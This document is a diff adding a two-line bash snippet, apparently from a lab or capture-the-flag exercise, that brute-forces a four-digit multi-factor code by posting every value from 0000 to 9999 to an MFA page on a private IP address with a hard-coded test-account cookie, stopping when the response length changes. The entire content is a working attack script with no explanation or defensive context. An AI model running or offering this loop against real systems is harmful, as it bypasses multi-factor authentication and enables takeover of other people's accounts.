@@ -1,0 +1,2 @@
+#Run in CLI
+for i in {0000..9999}; do echo $i; curl -s -X POST --data "code=$i" 10.10.18.174/console/mfa.php --cookie "user=jason_test_account; pwd=abkr" | wc -l | grep -v "23"; if [ $? -eq 0 ]; then echo FOUND IT; break; fi; done
